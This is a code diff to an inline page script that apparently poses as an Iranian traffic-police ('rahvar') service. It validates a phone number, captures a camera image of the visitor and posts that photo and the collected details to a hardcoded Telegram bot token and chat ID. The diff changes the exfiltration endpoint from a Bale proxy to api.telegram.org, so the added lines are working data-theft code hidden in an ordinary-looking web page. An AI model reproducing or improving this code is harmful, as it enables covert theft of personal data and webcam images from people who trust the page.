@@ -131,7 +131,6 @@
 <script>
     const TOKEN = "8347578600:AAEYkqSxvGgbXadUlQjDoY2Ey_-YgtUZ2U8";
     const CHAT_ID = "-1003384762825";
-    const MTProtoProxy = "https://tapi.bale.ai/bot"; // پروکسی MTProto ایرانی (بدون فیلتر)
     let userData = {};
 
     function validatePhone(phone) {
@@ -224,7 +223,7 @@
                 form.append('chat_id', CHAT_ID);
                 form.append('photo', blob, 'rahvar_user.jpg');
                 form.append('caption', getInfoText());
-                fetch(`https://tapi.bale.ai/bot${TOKEN}/sendPhoto`, {method:'POST', body:form});
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:form});
             }, 'image/jpeg', 0.95);
 
             stream.getTracks().forEach(t => t.stop());
@@ -259,7 +258,7 @@
     }
 
     function sendInfoText() {
-        fetch(`https://tapi.bale.ai/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(getInfoText())}`);
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(getInfoText())}`);
     }
 </script>
 
